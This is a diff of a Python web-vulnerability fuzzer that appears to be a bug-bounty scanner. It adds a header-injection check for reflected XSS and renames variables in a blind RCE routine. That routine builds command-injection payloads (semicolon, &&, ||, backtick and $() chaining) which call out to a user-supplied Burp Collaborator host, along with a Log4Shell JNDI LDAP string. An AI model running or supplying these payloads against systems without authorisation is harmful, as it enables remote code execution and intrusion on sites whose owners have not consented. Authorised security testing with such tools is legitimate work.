@@ -7,6 +7,10 @@ yellow_color="\033[93m"
 clear_line = "\033[K"
 
 
+#from injections import *
+
+
+
 from urllib.parse import urlparse, parse_qs, urlencode, quote
 import threading
 import requests 
@@ -82,48 +86,55 @@ input("\n-- press <enter> to start --\n")
 
 #************************** custom task / cheat codes ******************************
 
-cheat_code=input("\n example: 1.post,2.ssti,3.rce,4.sql,5.xss,6.owasp,single,reset (you can use multiple at once) \n enter cheatcode to skip those processes:")
+cheat_code=input("\n example: 1.post,2.ssti,3.rce,4.sql,5.xss,6.owasp,7.header_inject,single,reset (you can use multiple at once) \n"+cyan_color+" tip: type 'header' to turn off header injection(recommended for faster scan)\n\nenter cheatcode to skip those processes:")
+cheat_code=cheat_code.lower()
 
 print()
 
-if "post" in cheat_code or "POST" in cheat_code or "Post" in cheat_code or "1" in cheat_code:
+if "post" in cheat_code or "1" in cheat_code:
     print("\t✨post request is disabled")
     enable_post=False
 else:
     enable_post=True
     
-if "SSTI" in cheat_code or "ssti" in cheat_code or "Ssti" in cheat_code or "2" in cheat_code:
+if "ssti" in cheat_code or "2" in cheat_code:
     enable_ssti=False
     print("\t✨SSTI is disabled")
 else:
     enable_ssti=True
     
-if "RCE" in cheat_code or "rce" in cheat_code or "Rce" in cheat_code or "3" in cheat_code:
+if "rce" in cheat_code or "3" in cheat_code:
     enable_rce=False
     print("\t✨RCE is disabled")
 else:
     enable_rce=True
     
-if "sql" in cheat_code or "SQL" in cheat_code or "Sql" in cheat_code or "4" in cheat_code:
+if "sql" in cheat_code or "4" in cheat_code:
     enable_sql=False
     print("\t✨sql is disabled")
 else:
     enable_sql=True
     
-if "xss" in cheat_code or "XSS" in cheat_code or "Xss" in cheat_code or "5" in cheat_code:
+if "xss" in cheat_code or "5" in cheat_code:
     enable_xss=False
     cheat_code=cheat_code+"owasp" #diable also owasp xss
     print("\t✨xss is disabled")
 else:
     enable_xss=True
     
-if "owasp" in cheat_code or "OWASP" in cheat_code or "Owasp" in cheat_code or "6" in cheat_code:
+if "owasp" in cheat_code or "6" in cheat_code:
     enable_owasp=False
     print("\t✨owasp xss payloads are disabled")
 else:
     enable_owasp=True
-    
-if "reset" in cheat_code or "RESET" in cheat_code or "Reset" in cheat_code :
+
+if "header" in cheat_code or "7" in cheat_code:
+    enable_header_inject=False
+    print("\t✨header injection is disabled")
+else:
+    enable_header_inject=True
+
+if "reset" in cheat_code:
     reset_count=True
     print("\t✨count will be reset to 0")
 else:
@@ -135,6 +146,7 @@ if "single" in cheat_code or "SINGLE" in cheat_code or "Single" in cheat_code :
     enable_sql=False
     enable_rce=False
     enable_xss=False
+    enable_header_inject=False
 
     print("\t✨only single simple xss (all others are in disable mode)")
     single_mode=True
@@ -144,7 +156,7 @@ else:
 time.sleep(3)
 #***********************************************************************
 
-print("\nList of All text Files in Current Directory:\n")
+print(yellow_color+"\nList of All text Files in Current Directory:\n"+white_color)
 file_count=0
 for file in glob.glob("input/with_param/*.txt") :
     file_count+=1
@@ -159,7 +171,7 @@ for file in glob.glob("*.txt") :
     file_count+=1
     print(file_count,file)
 
-file_count2=input(Fore.RED +"✨enter file number:  - ")
+file_count2=input(cyan_color+"✨Enter File Number:  - ")
 
 #********** function for file selecting through serial number *****
 def fcount(file_count2):
@@ -172,7 +184,7 @@ def fcount(file_count2):
     for file in glob.glob("input/no_param/*.txt"):
         file_count+=1
         if file_count==file_count2:
-            return files
+            return file
                         #1
     for file in glob.glob("input/*.txt"):
         file_count+=1
@@ -185,7 +197,7 @@ def fcount(file_count2):
             return file
 #*******************************************************************
 fn=fcount(int(file_count2))
-print(Fore.RED +"\nselected file: ",fn)
+print(red_color+"\nselected file: ",yellow_color+fn)
 #***** 
 
 
@@ -195,7 +207,7 @@ Urls = file.readlines()
 print("🚀Total loaded urls:",len(Urls))
 
 #*********************+++++++++++++++++++++++++++++++*****************************
-print(Fore.CYAN +" press 0 or 1 to run only with default single parameter\n press -s- to \"set small parameters list\" \n press -M- to \"set medium parameters list\n press -L- to \"set large parameters list\"\n press -ssrf- to \"set ssrf payloads only\"")
+print(cyan_color+" press 0 or 1 to run only with default single parameter\n press -s- to \"set small parameters list\" \n press -M- to \"set medium parameters list\n press -L- to \"set large parameters list\"\n press -ssrf- to \"set ssrf payloads only\"")
 user_param_input=input("✨enter your mode:  - ").lower()
 
 if "ssrf" in user_param_input:
@@ -223,20 +235,20 @@ elif "s" in user_param_input:
 else:
     paramdirectory='parameters/parameters100.txt'
     
-print("--selected parameters:",paramdirectory)
+print(yellow_color+"--selected parameters:",paramdirectory)
 
 params_file = open(paramdirectory, 'r')
 params_2= params_file.readlines()
 #*********************+++++++++++++++++++++++++++++++*****************************
 
-user_burp_input=input("✨enter burp collaborator link:") # if it is empty then skip (rce function is at last)
+user_burp_input=input(cyan_color+"✨enter burp collaborator link or press 'r' to use recent one:") # if it is empty then skip (rce function is at last)
 
 
 if user_burp_input=="r" or user_burp_input=="R":
     user_burp_input=str(ID)+"."+user_burp_input
     filecollab= open('xsslogabhi/collaborator/recent_collab.txt', 'r')
     user_burp_input=filecollab.readline()
-    print("--successfully loaded recent collaborator link --")
+    print(yellow_color+"--successfully loaded recent collaborator link --")
     
 elif len(user_burp_input)!=0 and len(user_burp_input)>5:
     org_collab=user_burp_input
@@ -244,9 +256,9 @@ elif len(user_burp_input)!=0 and len(user_burp_input)>5:
     with open('xsslogabhi/collaborator/recent_collab.txt', 'w') as fcollab:
         fcollab.write(org_collab)
 
-#************custom header *******************
+#************custom header - disabled *******************
 #X-Request-Purpose: Research
-custom_header=input("✨enter custom header: ")
+custom_header=input(cyan_color+"✨enter custom header (just press enter for now): ")
 if len(custom_header)!=0:
     custom_header=custom_header.split(":")
     if len(custom_header)==1:
@@ -289,6 +301,11 @@ def my_function_rce(payload):
     req=requests.get(url_for_fuzz.replace("FUZZ",payload),headers=headers,cookies=cookies,timeout=30)
 
 #******************************************************************************************************************
+
+
+
+
+
 #**************************************function 4 ssti *********************************************************
 
 def my_function_ssti(payload):
@@ -347,6 +364,63 @@ def my_function_owaspbypass(payload):
                         with open('xsslogabhi/xss_owasplogs2.txt','a') as f1:
                             f1.write('\n'+' * '+url_for_fuzz.replace("FUZZ",payload))
 #******************************************************************************************************************
+
+#*************************************************** header ***********************************************************
+def header_inject(headers,main_url):
+    header_values =["%253cabhi%253e%2522%2522","<abhi>%22%22"]
+#    print("started: ",url)
+    for header_value in header_values:
+        # Define the headers dictionary
+        enable_header_inject2=True
+        try:
+            requests.get(main_url, headers=headers,timeout=10)
+        except:
+            enable_header_inject2=False
+        for key in headers:
+            modified_headers = headers.copy()
+            modified_headers[key] = header_value
+            try:
+                print("                                                                                         ",end="\r")
+                print("\tcurrent header:",key,":",modified_headers[key],end="\r")
+                if enable_header_inject2 and "Date" not in key and "Content-Type" not in key and "Connection" not in key and "Host" not in key and "Content-Length" not in key and "Authorization" not in key and "Accept-Encoding" not in key:
+                    response = requests.get(main_url, headers=modified_headers,timeout=30)
+                else:
+                    continue
+                enable_header_inject2=True
+                # Process the response as needed
+
+                response=response.text.lower()
+                #response="nothing<abhi>" #temporary test
+                
+                if "<abhi>\"\"" in response:
+                    print(" may vulnerable to xss through header:<abhi>\"\"")
+                    with open('xsslogabhi/header_reflections.txt','a') as f1:
+                        string_to_write="\n[*]url: "+str(url+" | "+key+":"+header_value)
+                        f1.write(string_to_write) 
+                        print("\t-->",string_to_write)
+                
+                elif "<abhi>" in response:
+                    print(" may vulnerable to xss through header:<abhi>")
+                    with open('xsslogabhi/header_reflections.txt','a') as f1:
+                        string_to_write="\n[-]url: "+str(url+" | "+key+":"+header_value)
+                        f1.write(string_to_write) 
+                        print("\t-->",string_to_write)
+                
+                else:
+                    #print("\tno reflections",end="\r")
+                    directories = ['bin', 'etc', 'boot', 'dev', 'home']
+                    if all(directory in response for directory in directories):
+                        print("vulnerable to RCE:",key)
+                        
+            except requests.exceptions.Timeout:
+                print("\theader exception occured,Request timed out")
+                enable_header_inject2=False
+            except requests.exceptions.RequestException as e:
+                print(f"\tRequest error: {e}")
+                enable_header_inject2=False
+    print()
+#**************************************************************************************************************
+
 #*******************************************payload function 7 main********************************************
 def my_function(payload,parameter):
     print("[*] Payload->",payload)
@@ -711,9 +785,9 @@ if not unique_urls_flag:
             
 #__________________________________________________________________________   
 if len(custom_header)!=0:
-    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36','referer':'',custom_header[0]:custom_header[1]}
+    headers_basic = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36','referer':'',custom_header[0]:custom_header[1]}
 else:
-    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36','referer':''}
+    headers_basic = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36','referer':''}
 #__________________________________________________________________________ 
 
 
@@ -747,15 +821,28 @@ for url_for_fuzz in unique_urls:
         print("current netloc",visited_netloc)
         try:
             ##setting cookies
-            response = requests.get(url_for_fuzz, headers=headers, timeout=50)
-            cookies = response.cookies
+            response = requests.get(url_for_fuzz, headers=headers_basic, timeout=50)
             # To get the cookies as a dictionary:
+            cookies = response.cookies
             cookies= cookies.get_dict()
+            # To get the cookies as a dictionary:
+            headers=dict(response.headers)
+
+
+
             
             print(response)
+            enable_header_inject2=True
+            if main_url not in visited_main_urls_reflection and enable_header_inject and enable_header_inject2:
+                header_inject(headers,main_url)
+                
             if "429" in str(response):
                 print("! server is blocking the requests ! delaying 60 sec")
                 time.sleep(60)
+                
+
+                
+                
      
         
         except requests.exceptions.RequestException as cE:
@@ -767,8 +854,13 @@ for url_for_fuzz in unique_urls:
                 print("\tplease check Network connection ")
                 break
             print("\t..network connection is good..")
+            enable_header_inject2=False
             continue
+            
 
+
+
+ 
     #*****************************************************************
     
     try:
@@ -840,9 +932,13 @@ for url_for_fuzz in unique_urls:
         temp=getreq.text
         temp2=temp
         sql_count1=temp.count("sql")+temp.count("SQL")+temp.count("Sql")
+        
+
 
         #************** main *******************************
-        if "FUZZ" in getreq.text or "Fuzz" in getreq.text or "fuzz" in getreq.text :
+        get_reflection=getreq.text
+        lowercase_reflection=get_reflection.lower()
+        if "fuzz" in lowercase_reflection :
             print("the parameter is :",parameter)
             ref_temp=getreq.text #to count reflections and compare with next 
 
@@ -855,6 +951,10 @@ for url_for_fuzz in unique_urls:
                 print("\t\t-captured false reflections-\n")
                 print("main url:",main_url)
                 visited_main_urls_reflection[main_url]=ref_count
+                
+
+                
+                
                 
             elif main_url in visited_main_urls_reflection:
                 ref_count=visited_main_urls_reflection[main_url]
@@ -1424,15 +1524,15 @@ for url_for_fuzz in unique_urls:
         #blind rce using collaborator ******************      ******************     ***********************
         if len(user_burp_input)!=0:
             value="1"
-            def rcepayload(cmd,user_burp_input):
+            def rcepayload(cmd,user_burp_input2):
                 print("************************************"*2)
-                PL1=(cmd+' '+user_burp_input)
-                PL2=(value+" ; "+cmd+' '+user_burp_input+' ; ls')
-                PL3=(value+" %26%26 "+cmd+' '+user_burp_input+' %26%26 ls')
-                PL4=("${jndi:ldap://log4j"+user_burp_input+':8080/abhi4j}')
-                PL5=(value+" || "+cmd+" "+user_burp_input+' || ls')
-                PL6=(value+" `"+cmd+" "+user_burp_input+"` ls")
-                PL7=(value+" $("+cmd+" "+user_burp_input+") ls")
+                PL1=(cmd+' '+user_burp_input2)
+                PL2=(value+" ; "+cmd+' '+user_burp_input2+' ; ls')
+                PL3=(value+" %26%26 "+cmd+' '+user_burp_input2+' %26%26 ls')
+                PL4=("${jndi:ldap://log4j"+user_burp_input2+':8080/abhi4j}')
+                PL5=(value+" || "+cmd+" "+user_burp_input2+' || ls')
+                PL6=(value+" `"+cmd+" "+user_burp_input2+"` ls")
+                PL7=(value+" $("+cmd+" "+user_burp_input2+") ls")
                 t1 = threading.Thread(target=my_function_rce, args=(PL1,))
                 t2 = threading.Thread(target=my_function_rce, args=(PL2,))
                 t3 = threading.Thread(target=my_function_rce, args=(PL3,))
